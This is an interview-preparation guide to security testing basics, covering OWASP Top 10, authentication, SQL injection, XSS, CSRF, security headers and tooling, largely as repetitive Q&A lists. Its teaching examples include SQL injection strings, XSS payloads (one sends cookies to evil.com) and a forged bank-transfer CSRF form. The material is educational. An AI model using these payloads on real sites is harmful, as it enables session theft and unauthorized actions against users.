# Security Testing Basics - Complete Interview Preparation Guide

---

## TABLE OF CONTENTS
1. Security Testing Fundamentals
2. Security Testing Types
3. OWASP Top 10
4. Authentication Testing
5. Authorization Testing
6. Session Management Testing
7. Input Validation Testing
8. SQL Injection
9. XSS (Cross-Site Scripting)
10. CSRF (Cross-Site Request Forgery)
11. Security Headers
12. Data Encryption Testing
13. API Security Testing
14. Mobile Security Testing
15. Security Testing Tools
16. Security Testing in CI/CD
17. Security Testing Best Practices
18. Common Security Vulnerabilities
19. Security Testing Process
20. Common Interview Questions
21. Scenario Examples
22. Practice Scenarios

---

## 1. SECURITY TESTING FUNDAMENTALS

### What is Security Testing?
Security testing is a type of software testing that identifies vulnerabilities, threats, and risks in a software application and prevents malicious attacks from intruders.

### Security Testing Objectives

**Objectives:**
- Identify vulnerabilities
- Prevent unauthorized access
- Protect data integrity
- Ensure data confidentiality
- Ensure system availability

### Security Testing Principles

**Principles:**
- CIA Triad: Confidentiality, Integrity, Availability
- Defense in depth
- Least privilege
- Security by design
- Fail securely

### Security Testing vs Functional Testing

| Aspect | Security Testing | Functional Testing |
|--------|------------------|-------------------|
- Security: Vulnerabilities, threats
- Functional: Features, requirements
- Security: Malicious attacks
- Functional: User behavior

### Interview Questions

**Q1: What is security testing?**
- Identifies vulnerabilities
- Prevents unauthorized access
- Protects data integrity
- Ensures confidentiality and availability

**Q2: What are security testing objectives?**
- Identify vulnerabilities
- Prevent unauthorized access
- Protect data integrity
- Ensure confidentiality and availability

**Q3: What is the CIA triad?**
- Confidentiality: Data protection
- Integrity: Data accuracy
- Availability: System uptime

---

## 2. SECURITY TESTING TYPES

### Vulnerability Scanning

**Purpose:**
- Identify known vulnerabilities
- Scan for security weaknesses
- Use automated tools
- Generate reports

### Penetration Testing

**Purpose:**
- Simulate real attacks
- Identify exploitable vulnerabilities
- Test security controls
- Provide remediation recommendations

### Security Auditing

**Purpose:**
- Review security controls
- Verify compliance
- Assess security posture
- Identify gaps

### Ethical Hacking

**Purpose:**
- Authorized hacking
- Identify vulnerabilities
- Test security measures
- Improve security

### Interview Questions

**Q1: What are the types of security testing?**
- Vulnerability scanning
- Penetration testing
- Security auditing
- Ethical hacking

**Q2: What is vulnerability scanning?**
- Identify known vulnerabilities
- Scan for security weaknesses
- Use automated tools
- Generate reports

**Q3: What is penetration testing?**
- Simulate real attacks
- Identify exploitable vulnerabilities
- Test security controls
- Provide recommendations

---

## 3. OWASP TOP 10

### OWASP Top 10 (2021)

1. **Broken Access Control**: Improper implementation of access controls
2. **Cryptographic Failures**: Failures related to cryptography
3. **Injection**: SQL, NoSQL, OS, and LDAP injection
4. **Insecure Design**: Flaws in design and architecture
5. **Security Misconfiguration**: Misconfigured security settings
6. **Vulnerable and Outdated Components**: Using outdated components
7. **Identification and Authentication Failures**: Weak authentication
8. **Software and Data Integrity Failures**: Code and data integrity
9. **Security Logging and Monitoring Failures**: Lack of logging
10. **Server-Side Request Forgery (SSRF)**: Server-side request forgery

### OWASP Testing Guide

**Guide:**
- Comprehensive testing guide
- Testing procedures
- Best practices
- Tools and techniques

### Interview Questions

**Q1: What is OWASP Top 10?**
- Top 10 security risks
- Updated regularly
- Industry standard
- Testing guide

**Q2: What are the top OWASP risks?**
- Broken access control
- Cryptographic failures
- Injection
- Security misconfiguration

**Q3: Why is OWASP important?**
- Industry standard
- Comprehensive guide
- Best practices
- Risk awareness

---

## 4. AUTHENTICATION TESTING

### Authentication Testing

**Purpose:**
- Test authentication mechanisms
- Identify weak authentication
- Test password policies
- Test multi-factor authentication

### Common Authentication Issues

**Issues:**
- Weak passwords
- No password complexity
- No account lockout
- No MFA
- Hardcoded credentials

### Authentication Testing Techniques

**Techniques:**
- Brute force attacks
- Dictionary attacks
- Credential stuffing
- Session hijacking
- Testing MFA

### Interview Questions

**Q1: What is authentication testing?**
- Test authentication mechanisms
- Identify weak authentication
- Test password policies
- Test MFA

**Q2: What are common authentication issues?**
- Weak passwords
- No password complexity
- No account lockout
- No MFA
- Hardcoded credentials

**Q3: What are authentication testing techniques?**
- Brute force attacks
- Dictionary attacks
- Credential stuffing
- Session hijacking

---

## 5. AUTHORIZATION TESTING

### Authorization Testing

**Purpose:**
- Test access controls
- Verify permissions
- Test role-based access
- Test horizontal/vertical privilege escalation

### Common Authorization Issues

**Issues:**
- Broken access control
- Privilege escalation
- Insecure direct object references
- Missing authorization
- Overly permissive access

### Authorization Testing Techniques

**Techniques:**
- Test role-based access
- Test horizontal privilege escalation
- Test vertical privilege escalation
- Test insecure direct object references
- Test API authorization

### Interview Questions

**Q1: What is authorization testing?**
- Test access controls
- Verify permissions
- Test role-based access
- Test privilege escalation

**Q2: What are common authorization issues?**
- Broken access control
- Privilege escalation
- Insecure direct object references
- Missing authorization

**Q3: What are authorization testing techniques?**
- Test role-based access
- Test horizontal privilege escalation
- Test vertical privilege escalation
- Test IDOR

---

## 6. SESSION MANAGEMENT TESTING

### Session Management Testing

**Purpose:**
- Test session handling
- Test session timeout
- Test session fixation
- Test session hijacking

### Common Session Issues

**Issues:**
- Weak session IDs
- No session timeout
- Session fixation
- Session hijacking
- Insecure session storage

### Session Testing Techniques

**Techniques:**
- Test session ID generation
- Test session timeout
- Test session fixation
- Test session hijacking
- Test session invalidation

### Interview Questions

**Q1: What is session management testing?**
- Test session handling
- Test session timeout
- Test session fixation
- Test session hijacking

**Q2: What are common session issues?**
- Weak session IDs
- No session timeout
- Session fixation
- Session hijacking
- Insecure session storage

**Q3: What are session testing techniques?**
- Test session ID generation
- Test session timeout
- Test session fixation
- Test session hijacking

---

## 7. INPUT VALIDATION TESTING

### Input Validation Testing

**Purpose:**
- Test input validation
- Test for injection attacks
- Test input sanitization
- Test input length limits

### Common Input Validation Issues

**Issues:**
- No input validation
- Weak validation
- Client-side only validation
- No input sanitization
- No length limits

### Input Testing Techniques

**Techniques:**
- SQL injection testing
- XSS testing
- Command injection testing
- Path traversal testing
- Input fuzzing

### Interview Questions

**Q1: What is input validation testing?**
- Test input validation
- Test for injection attacks
- Test input sanitization
- Test input length limits

**Q2: What are common input validation issues?**
- No input validation
- Weak validation
- Client-side only validation
- No input sanitization

**Q3: What are input testing techniques?**
- SQL injection testing
- XSS testing
- Command injection testing
- Path traversal testing

---

## 8. SQL INJECTION

### What is SQL Injection?
SQL injection is a code injection technique that exploits vulnerabilities in an application's software by inserting malicious SQL statements into an entry field.

### SQL Injection Types

**Types:**
- Classic SQL injection
- Blind SQL injection
- Time-based SQL injection
- Union-based SQL injection
- Error-based SQL injection

### SQL Injection Testing

**Testing:**
```sql
-- Basic SQL injection
' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT NULL, NULL, NULL--

-- Blind SQL injection
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--
```

### SQL Injection Prevention

**Prevention:**
- Use parameterized queries
- Use prepared statements
- Input validation
- Use ORM frameworks
- Least privilege database access

### Interview Questions

**Q1: What is SQL injection?**
- Code injection technique
- Inserts malicious SQL
- Exploits vulnerabilities
- Access unauthorized data

**Q2: What are SQL injection types?**
- Classic SQL injection
- Blind SQL injection
- Time-based SQL injection
- Union-based SQL injection

**Q3: How do you prevent SQL injection?**
- Use parameterized queries
- Use prepared statements
- Input validation
- Use ORM frameworks

---

## 9. XSS (CROSS-SITE SCRIPTING)

### What is XSS?
Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

### XSS Types

**Types:**
- Stored XSS
- Reflected XSS
- DOM-based XSS

### XSS Testing

**Testing:**
```html
<!-- Basic XSS payload -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Stored XSS -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

### XSS Prevention

**Prevention:**
- Input validation
- Output encoding
- Content Security Policy (CSP)
- HTTPOnly cookies
- Sanitize input

### Interview Questions

**Q1: What is XSS?**
- Cross-Site Scripting
- Inject malicious scripts
- Exploits web pages
- Steal user data

**Q2: What are XSS types?**
- Stored XSS
- Reflected XSS
- DOM-based XSS

**Q3: How do you prevent XSS?**
- Input validation
- Output encoding
- Content Security Policy (CSP)
- HTTPOnly cookies

---

## 10. CSRF (CROSS-SITE REQUEST FORGERY)

### What is CSRF?
Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.

### CSRF Testing

**Testing:**
```html
<!-- CSRF attack -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">
<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
```

### CSRF Prevention

**Prevention:**
- CSRF tokens
- SameSite cookie attribute
- Verify origin header
- Double submit cookie
- Custom HTTP headers

### Interview Questions

**Q1: What is CSRF?**
- Cross-Site Request Forgery
- Forces unwanted actions
- Exploits authenticated users
- Executes malicious requests

**Q2: How do you test for CSRF?**
- Test without CSRF token
- Test with forged requests
- Test origin verification
- Test cookie attributes

**Q3: How do you prevent CSRF?**
- CSRF tokens
- SameSite cookie attribute
- Verify origin header
- Double submit cookie

---

## 11. SECURITY HEADERS

### Common Security Headers

**Headers:**
- **X-Frame-Options**: Prevent clickjacking
- **X-XSS-Protection**: XSS protection
- **Content-Security-Policy**: Resource loading control
- **Strict-Transport-Security**: HTTPS enforcement
- **X-Content-Type-Options**: MIME sniffing prevention

### Security Headers Testing

**Testing:**
```bash
# Check security headers
curl -I https://example.com

# Expected headers
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
```

### Interview Questions

**Q1: What are common security headers?**
- X-Frame-Options: Prevent clickjacking
- X-XSS-Protection: XSS protection
- Content-Security-Policy: Resource loading
- Strict-Transport-Security: HTTPS

**Q2: How do you test security headers?**
- Use curl to check headers
- Verify each header
- Check header values
- Test missing headers

**Q3: What is Content-Security-Policy?**
- Controls resource loading
- Prevents XSS
- Defines allowed sources
- Whitelist approach

---

## 12. DATA ENCRYPTION TESTING

### Encryption Testing

**Purpose:**
- Test data encryption
- Test encryption algorithms
- Test key management
- Test data at rest
- Test data in transit

### Encryption Testing Areas

**Areas:**
- Data at rest encryption
- Data in transit encryption
- Key management
- Encryption algorithms
- Encryption strength

### Encryption Testing Tools

**Tools:**
- OpenSSL
- Wireshark
- Nmap
- Custom scripts

### Interview Questions

**Q1: What is encryption testing?**
- Test data encryption
- Test encryption algorithms
- Test key management
- Test data at rest and in transit

**Q2: What are encryption testing areas?**
- Data at rest encryption
- Data in transit encryption
- Key management
- Encryption algorithms

**Q3: What tools are used for encryption testing?**
- OpenSSL
- Wireshark
- Nmap
- Custom scripts

---

## 13. API SECURITY TESTING

### API Security Testing

**Purpose:**
- Test API authentication
- Test API authorization
- Test API input validation
- Test API rate limiting
- Test API encryption

### Common API Security Issues

**Issues:**
- Broken authentication
- Broken authorization
- Excessive data exposure
- Lack of rate limiting
- Insecure endpoints

### API Testing Tools

**Tools:**
- OWASP ZAP
- Postman
- Burp Suite
- SoapUI

### Interview Questions

**Q1: What is API security testing?**
- Test API authentication
- Test API authorization
- Test API input validation
- Test API rate limiting

**Q2: What are common API security issues?**
- Broken authentication
- Broken authorization
- Excessive data exposure
- Lack of rate limiting

**Q3: What tools are used for API security testing?**
- OWASP ZAP
- Postman
- Burp Suite
- SoapUI

---

## 14. MOBILE SECURITY TESTING

### Mobile Security Testing

**Purpose:**
- Test mobile app security
- Test data storage
- Test network communication
- Test authentication
- Test encryption

### Common Mobile Security Issues

**Issues:**
- Insecure data storage
- Weak encryption
- Hardcoded credentials
- Insecure communication
- Root/jailbreak detection

### Mobile Testing Tools

**Tools:**
- MobSF (Mobile Security Framework)
- OWASP ZAP
- Burp Suite
- Frida

### Interview Questions

**Q1: What is mobile security testing?**
- Test mobile app security
- Test data storage
- Test network communication
- Test authentication

**Q2: What are common mobile security issues?**
- Insecure data storage
- Weak encryption
- Hardcoded credentials
- Insecure communication

**Q3: What tools are used for mobile security testing?**
- MobSF
- OWASP ZAP
- Burp Suite
- Frida

---

## 15. SECURITY TESTING TOOLS

### OWASP ZAP

**Features:**
- Free and open-source
- Automated scanner
- Manual testing tools
- Proxy for intercepting requests
- API security testing

### Burp Suite

**Features:**
- Web application security testing
- Proxy for intercepting requests
- Scanner for vulnerabilities
- Intruder for fuzzing
- Repeater for manual testing

### Other Tools

**Tools:**
- Nessus: Vulnerability scanning
- Wireshark: Network analysis
- Nmap: Network scanning
- Metasploit: Penetration testing

### Interview Questions

**Q1: What is OWASP ZAP?**
- Free and open-source
- Automated scanner
- Manual testing tools
- Proxy for intercepting requests

**Q2: What is Burp Suite?**
- Web application security testing
- Proxy for intercepting requests
- Scanner for vulnerabilities
- Intruder for fuzzing

**Q3: What other security testing tools are available?**
- Nessus: Vulnerability scanning
- Wireshark: Network analysis
- Nmap: Network scanning
- Metasploit: Penetration testing

---

## 16. SECURITY TESTING IN CI/CD

### CI/CD Security Integration

**Integration:**
- SAST (Static Application Security Testing)
- DAST (Dynamic Application Security Testing)
- SCA (Software Composition Analysis)
- Container security scanning
- Dependency scanning

### Security Gates

**Gates:**
- Block on high vulnerabilities
- Block on critical vulnerabilities
- Require security approval
- Monitor security metrics

### CI/CD Security Tools

**Tools:**
- SonarQube: SAST
- OWASP ZAP: DAST
- Snyk: SCA
- Trivy: Container scanning

### Interview Questions

**Q1: How do you integrate security testing in CI/CD?**
- SAST: Static analysis
- DAST: Dynamic analysis
- SCA: Dependency scanning
- Container scanning

**Q2: What are security gates in CI/CD?**
- Block on high vulnerabilities
- Block on critical vulnerabilities
- Require security approval
- Monitor metrics

**Q3: What tools are used for CI/CD security?**
- SonarQube: SAST
- OWASP ZAP: DAST
- Snyk: SCA
- Trivy: Container scanning

---

## 17. SECURITY TESTING BEST PRACTICES

### Test Early

**Practice:**
- Start security testing early
- Test during development
- Test in CI/CD
- Continuous security testing

### Test Regularly

**Practice:**
- Regular security scans
- Regular penetration tests
- Regular security audits
- Continuous monitoring

### Use Multiple Tools

**Practice:**
- Use multiple security tools
- Combine automated and manual testing
- Use different techniques
- Cross-validate findings

### Interview Questions

**Q1: What are security testing best practices?**
- Test early
- Test regularly
- Use multiple tools
- Document findings

**Q2: Why test security early?**
- Identify vulnerabilities early
- Cheaper to fix
- Prevent production issues
- Build security in

**Q3: Why use multiple security tools?**
- Different tools find different issues
- Cross-validate findings
- Comprehensive coverage
- Reduce false positives

---

## 18. COMMON SECURITY VULNERABILITIES

### OWASP Top 10 Vulnerabilities

1. **Broken Access Control**: Improper access controls
2. **Cryptographic Failures**: Weak encryption
3. **Injection**: SQL, XSS, command injection
4. **Insecure Design**: Design flaws
5. **Security Misconfiguration**: Misconfigured settings
6. **Vulnerable Components**: Outdated dependencies
7. **Authentication Failures**: Weak authentication
8. **Data Integrity Failures**: Code/data integrity
9. **Logging Failures**: Lack of logging
10. **SSRF**: Server-side request forgery

### Common Web Vulnerabilities

**Vulnerabilities:**
- SQL injection
- XSS
- CSRF
- Broken authentication
- Broken access control

### Interview Questions

**Q1: What are the OWASP Top 10 vulnerabilities?**
- Broken access control
- Cryptographic failures
- Injection
- Security misconfiguration

**Q2: What are common web vulnerabilities?**
- SQL injection
- XSS
- CSRF
- Broken authentication
- Broken access control

**Q3: How do you prioritize vulnerabilities?**
- CVSS score
- Exploitability
- Impact
- Business risk

---

## 19. SECURITY TESTING PROCESS

### Planning Phase

**Activities:**
- Define scope
- Identify assets
- Identify threats
- Select tools
- Plan testing

### Execution Phase

**Activities:**
- Vulnerability scanning
- Penetration testing
- Manual testing
- Document findings

### Reporting Phase

**Activities:**
- Document findings
- Assess risk
- Provide recommendations
- Create remediation plan

### Interview Questions

**Q1: What are the phases of security testing?**
- Planning: Define scope
- Execution: Run tests
- Reporting: Document findings
- Remediation: Fix issues

**Q2: What happens in the planning phase?**
- Define scope
- Identify assets
- Identify threats
- Select tools

**Q3: What happens in the reporting phase?**
- Document findings
- Assess risk
- Provide recommendations
- Create remediation plan

---

## 20. COMMON INTERVIEW QUESTIONS

### Fundamentals

**Q1: What is security testing?**
- Identifies vulnerabilities
- Prevents unauthorized access
- Protects data integrity
- Ensures confidentiality and availability

**Q2: What are security testing objectives?**
- Identify vulnerabilities
- Prevent unauthorized access
- Protect data integrity
- Ensure confidentiality and availability

**Q3: What is the CIA triad?**
- Confidentiality: Data protection
- Integrity: Data accuracy
- Availability: System uptime

### Testing Types

**Q4: What are the types of security testing?**
- Vulnerability scanning
- Penetration testing
- Security auditing
- Ethical hacking

**Q5: What is vulnerability scanning?**
- Identify known vulnerabilities
- Scan for security weaknesses
- Use automated tools
- Generate reports

**Q6: What is penetration testing?**
- Simulate real attacks
- Identify exploitable vulnerabilities
- Test security controls
- Provide recommendations

### OWASP

**Q7: What is OWASP Top 10?**
- Top 10 security risks
- Updated regularly
- Industry standard
- Testing guide

**Q8: What are the top OWASP risks?**
- Broken access control
- Cryptographic failures
- Injection
- Security misconfiguration

**Q9: Why is OWASP important?**
- Industry standard
- Comprehensive guide
- Best practices
- Risk awareness

### Authentication

**Q10: What is authentication testing?**
- Test authentication mechanisms
- Identify weak authentication
- Test password policies
- Test MFA

**Q11: What are common authentication issues?**
- Weak passwords
- No password complexity
- No account lockout
- No MFA

**Q12: What are authentication testing techniques?**
- Brute force attacks
- Dictionary attacks
- Credential stuffing
- Session hijacking

### Authorization

**Q13: What is authorization testing?**
- Test access controls
- Verify permissions
- Test role-based access
- Test privilege escalation

**Q14: What are common authorization issues?**
- Broken access control
- Privilege escalation
- Insecure direct object references
- Missing authorization

**Q15: What are authorization testing techniques?**
- Test role-based access
- Test horizontal privilege escalation
- Test vertical privilege escalation
- Test IDOR

### SQL Injection

**Q16: What is SQL injection?**
- Code injection technique
- Inserts malicious SQL
- Exploits vulnerabilities
- Access unauthorized data

**Q17: What are SQL injection types?**
- Classic SQL injection
- Blind SQL injection
- Time-based SQL injection
- Union-based SQL injection

**Q18: How do you prevent SQL injection?**
- Use parameterized queries
- Use prepared statements
- Input validation
- Use ORM frameworks

### XSS

**Q19: What is XSS?**
- Cross-Site Scripting
- Inject malicious scripts
- Exploits web pages
- Steal user data

**Q20: What are XSS types?**
- Stored XSS
- Reflected XSS
- DOM-based XSS

**Q21: How do you prevent XSS?**
- Input validation
- Output encoding
- Content Security Policy (CSP)
- HTTPOnly cookies

### CSRF

**Q22: What is CSRF?**
- Cross-Site Request Forgery
- Forces unwanted actions
- Exploits authenticated users
- Executes malicious requests

**Q23: How do you test for CSRF?**
- Test without CSRF token
- Test with forged requests
- Test origin verification
- Test cookie attributes

**Q24: How do you prevent CSRF?**
- CSRF tokens
- SameSite cookie attribute
- Verify origin header
- Double submit cookie

### Security Headers

**Q25: What are common security headers?**
- X-Frame-Options: Prevent clickjacking
- X-XSS-Protection: XSS protection
- Content-Security-Policy: Resource loading
- Strict-Transport-Security: HTTPS

**Q26: How do you test security headers?**
- Use curl to check headers
- Verify each header
- Check header values
- Test missing headers

**Q27: What is Content-Security-Policy?**
- Controls resource loading
- Prevents XSS
- Defines allowed sources
- Whitelist approach

### Scenario-Based

**Q28: How do you design a security testing strategy?**
- Define scope
- Identify threats
- Select tools
- Plan testing
- Document findings

**Q29: How do you handle security vulnerabilities?**
- Assess risk
- Prioritize based on CVSS
- Create remediation plan
- Verify fixes

**Q30: How do you communicate security findings to stakeholders?**
- Executive summary
- Risk assessment
- Recommendations
- Remediation timeline

---

## CONCLUSION

This comprehensive guide covers all essential security testing basics topics for interview preparation. Key takeaways:

1. **Security Testing**: Identifies vulnerabilities, prevents unauthorized access
2. **Types**: Vulnerability scanning, penetration testing, auditing, ethical hacking
3. **OWASP Top 10**: Industry standard, top security risks, testing guide
4. **Authentication**: Test mechanisms, password policies, MFA
5. **Authorization**: Access controls, permissions, privilege escalation
6. **Session Management**: Session handling, timeout, fixation, hijacking
7. **Input Validation**: Injection attacks, sanitization, length limits
8. **SQL Injection**: Code injection, types, prevention with parameterized queries
9. **XSS**: Cross-Site Scripting, stored/reflected/DOM, prevention with CSP
10. **CSRF**: Cross-Site Request Forgery, tokens, SameSite cookies
11. **Security Headers**: X-Frame-Options, CSP, HSTS, X-Content-Type-Options
12. **Encryption**: Data at rest, data in transit, key management
13. **API Security**: Authentication, authorization, rate limiting
14. **Mobile Security**: Data storage, encryption, hardcoded credentials
15. **Tools**: OWASP ZAP, Burp Suite, Nessus, Wireshark
16. **CI/CD**: SAST, DAST, SCA, container scanning
17. **Best Practices**: Test early, test regularly, use multiple tools
18. **Vulnerabilities**: OWASP Top 10, SQL injection, XSS, CSRF
19. **Process**: Planning, execution, reporting, remediation
20. **Practice**: Test early, document findings, prioritize, communicate

Practice these concepts with real security testing projects and be prepared to explain the "why" behind each security measure. Good luck with your interview!
